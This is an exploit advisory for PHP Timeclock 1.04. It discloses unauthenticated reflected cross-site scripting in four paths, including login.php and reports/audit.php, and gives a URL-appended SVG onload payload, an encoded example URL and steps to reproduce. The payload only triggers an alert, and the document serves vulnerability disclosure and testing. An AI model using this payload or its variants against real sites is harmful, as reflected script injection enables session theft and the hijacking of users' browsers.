# Exploit Title: PHP Timeclock 1.04 Multiple Unauthenticated Reflected Cross Site Scripting (XSS)
# Google Dork: N/A
# Date: May 3rd 2021
# Exploit Author: Tyler Butler
#         Twitter:  https://twitter.com/tbutler0x90
#         Website:  https://tbutler.org
#         Linkedin: https://www.linkedin.com/in/tyler-b-a700a1aa/
# Vendor Homepage: http://timeclock.sourceforge.net
# Software Link: https://sourceforge.net/projects/timeclock/files/PHP%20Timeclock/PHP%20Timeclock%201.04/
# Version: 1.04
# Tested on: PHP 4.4.9/5.3.3 Apache 2.2 MySql 4.1.22/5
# CVE : N/A


Description: PHP Timeclock version 1.04 (and prior) suffers from multiple Unauthenticated Reflected Cross-Site Scripting Vulnerabilities. Arbitrary javascript can be injected into the application by appending a termination /'> and payload directly to the end of the GET request URL. The vulnerable paths include (1) /login.php  (2) /timeclock.php (3) /reports/audit.php and (4) /reports/timerpt.php. 


Payload: /'><svg/onload=alert`xss`>

Example: http://target/login.php/'%3E%3Csvg/onload=alert%60xss%60%3E
ÃŸ

Steps to reproduce:
  1. Navigate to a site that uses PHP Timeclock 1.04 or earlier
  2. Make a GET request to one of the four resources mentioned above
  3. Append /'> and the payload to the end of the request
  4. Submit the request and observe payload execution